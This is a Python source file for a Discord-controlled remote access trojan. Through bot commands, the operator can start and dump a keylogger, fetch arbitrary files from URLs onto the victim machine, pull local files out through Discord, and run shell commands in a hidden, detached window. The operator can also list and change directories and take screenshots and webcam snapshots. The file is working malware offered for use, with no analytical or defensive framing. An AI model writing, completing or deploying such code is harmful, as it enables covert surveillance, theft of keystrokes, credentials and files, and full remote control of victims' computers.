import os, datetime, pyautogui, subprocess, zipfile, requests, cv2
import discord, io

from Logger import Keylogger
from urllib.parse import urlparse
from discord.ext import commands

TOKEN = 'TOKEN'

intent = discord.Intents.all()
intent.message_content = True

bot = commands.Bot(command_prefix=".", intents=intent)
logger = Keylogger()

@bot.event
async def on_command_error(ctx: commands.Context, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"unkown command '{ctx.invoked_with}', type '.menu' for help")
        return

@bot.command()
async def hello(ctx: commands.Context):
    await ctx.send(f"hello, welcome! {ctx.author.mention}")

@bot.command()
async def keylog_start(ctx: commands.Context):
    await ctx.send("starting keylogger..")
    logger.start_log()
    await ctx.send("keylogger started!")

@bot.command()
async def keylog_read(ctx: commands.Context):
    data = logger.baca_log()
    await ctx.send(f"**keylogger dump:**\n```\n{data}\n```")

@bot.command()
async def keylog_stop(ctx: commands.Context):
    await ctx.send("stopping keylogger..")
    logger.stop_listener()
    await ctx.send("keylogger stopped!")

@bot.command()
async def upload(cxt: commands.Context, url=None, local_file=None):

    if not url:
        await cxt.send("enter a url to request a file into")
        return
    
    try:
        if not local_file:
            parsed = urlparse(url)
            local_file = os.path.basename(parsed.path)

            if not local_file:
                local_file = "WUFDGZ.html"
        
        await cxt.send(f"connecting to '{url}'")

        with requests.get(url, stream=True, timeout=30) as res:
            res.raise_for_status()
            with open(local_file, 'wb') as file:
                for chunk in res.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)

        await cxt.send("file is successfully uploaded")
    
    except requests.exceptions.HTTPError as e:
        await cxt.send(f"the server responded with status code: {res.status_code}\n```detail:\n{e}\n```")
    except requests.exceptions.ConnectionError as e:
        await cxt.send(f"can't connect to server ```detail:\n{e}\n```")
    except requests.exceptions.Timeout as e:
        await cxt.send("connection timed out by 30sec")
    except requests.exceptions.RequestException as e:
        await cxt.send(f"unknown error has occured ```detail:\n{e}\n```")
    except PermissionError:
        await cxt.send(f"you have no permission to write '{local_file}' file")
    except OSError as e:
        await cxt.send(f"{e}")
    except Exception as e:
        await cxt.send(f"{e}")

@bot.command()
async def download(ctx: commands.Context, file):
    limit = 20 * 1024
    zipped = f"{file}.zip"

    if not file:
        return await ctx.send("enter the filename you want to download")

    if os.path.getsize(file) > limit:
        await ctx.send("file is too big, compressing into zip")

        with zipfile.ZipFile(zipped, 'w', zipfile.ZIP_DEFLATED) as f:
            f.write(file, arcname=os.path.basename(file))

        if os.path.getsize(zipped) < limit:
            with open(zipped, 'rb') as f:
                await ctx.send(f"the compressed file:", file=discord.File(f))
            os.remove(zipped)
        else:
            await ctx.send("the compressed file is still above the limit, aborting")
            os.remove(zipped)
    else:
        with open(file, 'rb') as f:
            await ctx.send("file is ready to download:", file=discord.File(f))

@bot.command()
async def exe(ctx: commands.Context,*, cmd: str = None):
    if not cmd:
        return await ctx.send("enter a command you want to run")
    try:
        if ctx.author.id != 1434492547409117264:
            ctx.send("cannot run command, only author")
            return

        DETACHED_PROCESS = 0x00000008
        CREATE_NEW_PROCESS_GROUP = 0x00000200
        CREATE_NO_WINDOW = 0x08000000

        flag = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW

        result = subprocess.Popen(cmd, creationflags=flag, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
        stdout, stderr = result.communicate()
        res = stdout if result.returncode == 0 else stderr

        if not res or res.strip() == "":
            return await ctx.send("```[NO OUTPUT]```")

        if len(res) <= 1900:
            prefix = "**TERMINAL OUTPUT:**" if result.returncode == 0 else "**TERMINAL ERROR:**"
            await ctx.send(f"{prefix} ```\n{res}\n```")
        else:
            buffer = io.BytesIO(res.encode())
            buffer.seek(0)
            filename = "output.txt" if result.returncode == 0 else "error.txt"
            await ctx.send(
                content="ouput is too long, see it in this file:",
                file=discord.File(fp=buffer, filename=filename)
            )
    except subprocess.TimeoutExpired:
        await ctx.send(f"**TERMINAL ERROR:** ```program stopped because of timeout 30sec```")
    except Exception as e:
        await ctx.send(f"**TERMINAL ERROR:** ```\n{e}\n```")

@bot.command()
async def ls(ctx: commands.Context, *, path: str = '.'):
    try:
        path = os.path.abspath(path)
        if not path:
            raise FileNotFoundError(await ctx.send(f"directory not found '{path}'"))
        
        list = os.listdir(path)

        folders = []
        files = []

        for item in list:
            full_path = os.path.join(path, item)

            if os.path.isdir(full_path):
                folders.append(f" 📁 {item}")
            else:
                files.append(f" 📄 {item}")

        folder = "\n".join(folders) if folders else "[NO FOLDER HERE]"
        file = "\n".join(files) if files else "[NO FILE HERE]"

        msg = (
            f"the content of '{path}':\n\n"
            f"**FOLDER:**\n```\n{folder}\n```\n"
            f"**FILE:**\n```\n{file}\n```"
        )
        await ctx.send(msg)

    except TypeError:
        await ctx.send(f"the path must be string or a byte object")
    except ValueError:
        await ctx.send(f"the path contains invalid characters")
    except OSError as e:
        await ctx.send(f"{e}")
    except FileNotFoundError as e:
        await ctx.send(f"{e}")

@bot.command()
async def screenshot(ctx: commands.Context):
    pyautogui.screenshot("ss.png")
    file = "ss.png"

    if os.path.exists(file):
        await ctx.send(content=f"screenshot from {datetime.datetime.now()}", file=discord.File(file))
        os.remove(file)
    else:
        await ctx.send("can't take a screenshot")

@bot.command()
async def snapcam(ctx: commands.Context):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()

        if not ret:
            return

        cv2.imwrite("wcam.jpg", frame)
        await ctx.send(content=f"snapcam from {datetime.datetime.now()}", file=discord.File("wcam.jpg"))
        os.remove("wcam.jpg")
    except Exception as e:
        await ctx.send(f"can't access camera:\n```{e}```")

@bot.command()
async def marco(ctx: commands.Context):
    await ctx.send(f"polo! here's the latency: {round(bot.latency*1000)}ms")

@bot.command()
async def cd(ctx: commands.Context,*, path: str = None):
    try:
        if path is None:
            await ctx.send(f"current directory ```{os.getcwd()}```")
        else:
            os.chdir(path)
            await ctx.send(f"changed directory to ```{os.getcwd()}```")
    except FileNotFoundError:
        await ctx.send(f"directory '{path}' not found")
    except PermissionError:
        await ctx.send(f"you have no permission to access '{path}' directory")
    except NotADirectoryError:
        await ctx.send(f"This is a file, not a directory")


bot.run(TOKEN, reconnect=True)
